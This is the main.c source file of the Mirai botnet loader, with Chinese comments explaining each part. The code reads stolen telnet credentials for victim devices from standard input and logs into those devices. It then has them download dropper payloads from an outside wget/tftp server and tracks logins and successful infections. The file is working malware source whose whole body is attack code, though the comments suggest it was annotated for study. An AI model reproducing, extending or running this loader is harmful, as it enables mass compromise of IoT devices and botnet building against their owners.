#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <errno.h>
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/binary.h"
#include "headers/util.h"
// loader模块的代码：
//  这部分代码的功能就是向感染设备上传（wget、tftp、echo方式）对应架构的payload文件[bot dvrHelper]
/*
    headers/       头文件目录
    binary.c       将bins目录下的文件读取到内存中，以echo方式上传payload文件时用到
    connection.c   判断loader和感染设备telnet交互过程中的状态信息
    main.c         loader主函数
    server.c       向感染设备发起telnet交互，上传payload文件
    telnet_info.c  解析约定格式的telnet信息
    util.c         一些常用的公共函数
*/
static void *stats_thread(void *);

static struct server *srv;

char *id_tag = "telnet";

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;

#ifdef DEBUG
    addrs_len = 1;
    addrs = calloc(4, sizeof (ipv4_t));
    addrs[0] = inet_addr("0.0.0.0");
#else
    addrs_len = 2;
    addrs = calloc(addrs_len, sizeof (ipv4_t));

    addrs[0] = inet_addr("192.168.0.1"); // Address to bind to
    addrs[1] = inet_addr("192.168.1.1"); // Address to bind to
#endif

    if (argc == 2)
    {
        id_tag = args[1];
    }

    if (!binary_init())
    {
        printf("Failed to load bins/dlr.* as dropper\n");   //bins底下的文件实际都是dropper而已，不是真正的payload【所以loader/src是入侵的第一步，第二步是mirai目录下的文件（真正的payload）】
        return 1;
    }

    /* wget address tftp address */
    // 构建mirai(本地)-server(远程C&C)的连接结构体
    // 192.168.0.1和192.168.1.1 -> 100.200.100.100
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
    {
        printf("Failed to initialize server. Aborting\n");
        return 1;
    }

    pthread_create(&stats_thrd, NULL, stats_thread, NULL);

    // Read from stdin
    while (TRUE)
    {
        char strbuf[1024];

        if (fgets(strbuf, sizeof (strbuf), stdin) == NULL)  //从标准输入读取telnet的信息（应该是来自上报的victim节点telnet信息）
            break;

        util_trim(strbuf);

        if (strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        memset(&info, 0, sizeof(struct telnet_info));
        if (telnet_info_parse(strbuf, &info) == NULL)   //解析上报的telnet信息
            printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
        else
        {
            if (srv == NULL)
                printf("srv == NULL 2\n");

            server_queue_telnet(srv, &info);    //尝试连接，并且处理新的节点【将连接成功的fd加入server支持epoll交互池中】
            if (total++ % 1000 == 0)
                sleep(1);
        }

        ATOMIC_INC(&srv->total_input);
    }

    printf("Hit end of input.\n");

    while(ATOMIC_GET(&srv->curr_open) > 0)  //只要当前的conntection数量大于0，就一直循环。无连接就return。
        sleep(1);

    return 0;
}

//打印现在连接的信息情况。
static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while (TRUE)
    {
#ifndef DEBUG
        printf("%ds\tProcessed: %d\tConns: %d\tLogins: %d\tRan: %d\tEchoes:%d Wgets: %d, TFTPs: %d\n",
               seconds++, ATOMIC_GET(&srv->total_input), ATOMIC_GET(&srv->curr_open), ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));
#endif
        fflush(stdout);
        sleep(1);
    }
}
